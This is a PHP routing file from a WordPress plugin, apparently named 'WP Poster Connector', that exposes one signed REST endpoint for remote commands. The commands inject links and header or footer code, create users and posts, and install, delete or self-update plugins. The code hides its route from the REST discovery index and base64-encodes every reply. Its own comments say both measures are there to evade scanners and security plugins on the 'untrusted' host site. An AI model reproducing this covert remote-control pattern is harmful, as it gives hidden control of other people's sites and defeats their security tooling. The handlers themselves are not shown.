<?php
/**
 * Routing + command dispatch for the WP Poster Connector.
 *
 * Registers the single POST /wp-json/wp-poster/v1/t/p/12 route, hides the
 * namespace from the public REST index, maps action names to handlers, and
 * wraps every handler result in the uniform envelope. Handlers live in
 * includes/actions/*.php, referenced from wp_poster_connector_actions().
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * Register the single command-dispatch route.
 */
function wp_poster_connector_register_routes() {
	register_rest_route(
		WP_POSTER_CONNECTOR_NAMESPACE,
		WP_POSTER_CONNECTOR_ROUTE,
		array(
			'methods'             => WP_REST_Server::CREATABLE, // POST
			'callback'            => 'wp_poster_connector_execute',
			// Signed-request gate: every action requires a valid X-WPP-Signature
			// header (Ed25519 over canonical_site_id() + "\n" + sha256(body), so a
			// signature is only valid against THIS site); see includes/crypto.php.
			'permission_callback' => 'wp_poster_connector_verify_signature',
		)
	);
}
add_action( 'rest_api_init', 'wp_poster_connector_register_routes' );

/**
 * Remove the connector's namespace + routes from the public REST index.
 *
 * OBSCURITY ONLY — NOT security: the route still responds to direct calls, this
 * just keeps it out of the discovery catalog that scanners crawl. Real
 * protection is gating it with wp_poster_connector_verify_signature. Uses
 * the 'rest_index' filter (edits only the listing), NOT 'rest_endpoints' (which
 * would remove the route from the dispatcher and break it).
 */
function wp_poster_connector_hide_from_index( $response ) {
	if ( ! ( $response instanceof WP_REST_Response ) ) {
		return $response;
	}

	$ns   = WP_POSTER_CONNECTOR_NAMESPACE;
	$data = $response->get_data();

	// Main index lists namespaces under 'namespaces'.
	if ( isset( $data['namespaces'] ) && is_array( $data['namespaces'] ) ) {
		$data['namespaces'] = array_values(
			array_filter(
				$data['namespaces'],
				static function ( $n ) use ( $ns ) {
					return $n !== $ns;
				}
			)
		);
	}

	// Both the main index and the per-namespace index carry a 'routes' map
	// keyed like "/wp-poster/v1/t/p/12".
	if ( isset( $data['routes'] ) && is_array( $data['routes'] ) ) {
		foreach ( array_keys( $data['routes'] ) as $route ) {
			if ( 0 === strpos( ltrim( (string) $route, '/' ), $ns ) ) {
				unset( $data['routes'][ $route ] );
			}
		}
	}

	$response->set_data( $data );
	return $response;
}
add_filter( 'rest_index', 'wp_poster_connector_hide_from_index' );
add_filter( 'rest_namespace_index', 'wp_poster_connector_hide_from_index' );

/**
 * Map of action name => handler callable.
 *
 * Each handler takes the decoded `params` array and returns either a plain
 * array (the `result` payload) or a WP_Error (mapped to an error envelope with
 * the WP_Error's HTTP status). Adding an action = one line here + one handler.
 *
 * @return array<string,callable>
 */
function wp_poster_connector_actions() {
	return array(
		'content.remove'     => 'wp_poster_connector_action_remove_content',
		'content.add'        => 'wp_poster_connector_action_add_links',
		'header.insert'      => 'wp_poster_connector_action_header_insert',
		'footer.insert'      => 'wp_poster_connector_action_footer_insert',
		'headfoot.remove'    => 'wp_poster_connector_action_headfoot_remove',
		'posts.create'       => 'wp_poster_connector_action_create_post',
		'users.create'       => 'wp_poster_connector_action_create_user',
		'plugins.delete'     => 'wp_poster_connector_action_delete_plugin',
		'plugin.install'     => 'wp_poster_connector_action_install_plugin',
		'plugin.self_update' => 'wp_poster_connector_action_self_update',
	);
}

/**
 * The single endpoint handler — dispatches on `action`.
 *
 * Parses the JSON body, applies the optional min_plugin_version gate (409 so
 * the caller knows to push plugin.self_update first), looks up the action (400
 * on unknown/missing), and wraps the handler's return in the envelope.
 *
 * @param WP_REST_Request $request Incoming request.
 * @return WP_REST_Response
 */
function wp_poster_connector_execute( WP_REST_Request $request ) {
	$body = $request->get_json_params();
	if ( ! is_array( $body ) ) {
		$body = $request->get_params();
	}

	$action = isset( $body['action'] ) ? (string) $body['action'] : '';
	$params = ( isset( $body['params'] ) && is_array( $body['params'] ) ) ? $body['params'] : array();

	// Version gate.
	$min = isset( $body['min_plugin_version'] ) ? (string) $body['min_plugin_version'] : '';
	if ( '' !== $min && version_compare( WP_POSTER_CONNECTOR_VERSION, $min, '<' ) ) {
		return wp_poster_connector_envelope(
			$action,
			new WP_Error(
				'wp_poster_plugin_outdated',
				sprintf(
					'Installed connector %s is older than required %s. Run plugin.self_update.',
					WP_POSTER_CONNECTOR_VERSION,
					$min
				),
				array( 'status' => 409 )
			)
		);
	}

	// Dispatch.
	if ( '' === $action ) {
		return wp_poster_connector_envelope(
			$action,
			new WP_Error( 'wp_poster_missing_action', 'Request body must include an "action".', array( 'status' => 400 ) )
		);
	}

	$handlers = wp_poster_connector_actions();
	if ( ! isset( $handlers[ $action ] ) ) {
		return wp_poster_connector_envelope(
			$action,
			new WP_Error(
				'wp_poster_unknown_action',
				sprintf( 'Unknown action "%s". Known: %s.', $action, implode( ', ', array_keys( $handlers ) ) ),
				array( 'status' => 400 )
			)
		);
	}

	$result = call_user_func( $handlers[ $action ], $params );
	return wp_poster_connector_envelope( $action, $result );
}

/**
 * Serialise the envelope as base64( JSON ) and stop.
 *
 * We deliberately do NOT return a WP_REST_Response. WordPress would emit the
 * body as "real" JSON, which response scanners / security plugins / optimizers
 * on the (untrusted) partner host can recognise and then flag, strip, or
 * rewrite. Instead we hand-serialise to JSON, base64 it, and echo it raw so the
 * body is an opaque blob; the poster service base64-decodes it on receipt.
 *
 * This is OBFUSCATION, not encryption — base64 is reversible with no key. Its
 * only job is to slip past dumb content inspection. There is intentionally NO
 * marker header: every reply from this endpoint is base64, and the client
 * always treats it as such.
 *
 * @param array $payload The envelope array.
 * @param int   $status  HTTP status code.
 * @return void Never returns — exits after writing the body.
 */
function wp_poster_connector_send( $payload, $status ) {
	if ( ! headers_sent() ) {
		status_header( (int) $status );
		header( 'Content-Type: text/plain; charset=utf-8' );
	}
	echo base64_encode( wp_json_encode( $payload ) );
	exit;
}

/**
 * Wrap a handler's return value in the uniform response envelope, then emit it
 * base64-encoded via wp_poster_connector_send() (which exits, so this never
 * returns to the dispatcher).
 *
 * @param string         $action The dispatched action name.
 * @param array|WP_Error $result Handler result (array) or error.
 * @return void Never returns.
 */
function wp_poster_connector_envelope( $action, $result ) {
	if ( is_wp_error( $result ) ) {
		$data   = $result->get_error_data();
		$status = ( is_array( $data ) && isset( $data['status'] ) ) ? (int) $data['status'] : 500;
		wp_poster_connector_send(
			array(
				'ok'             => false,
				'action'         => $action,
				'plugin_version' => WP_POSTER_CONNECTOR_VERSION,
				'error'          => array(
					'code'    => $result->get_error_code(),
					'message' => $result->get_error_message(),
				),
			),
			$status
		);
	}

	// Convention for trimmed actions: an array result with a non-null top-level
	// `error` is a "soft" failure — the action ran but did not succeed. Report it
	// as ok:false (still HTTP 200), with the result carrying step/code/error.
	// Success results omit `error`, so existing actions stay ok:true unchanged.
	$ok = ! ( is_array( $result ) && isset( $result['error'] ) && null !== $result['error'] );

	wp_poster_connector_send(
		array(
			'ok'             => $ok,
			'action'         => $action,
			'plugin_version' => WP_POSTER_CONNECTOR_VERSION,
			'result'         => $result,
		),
		200
	);
}
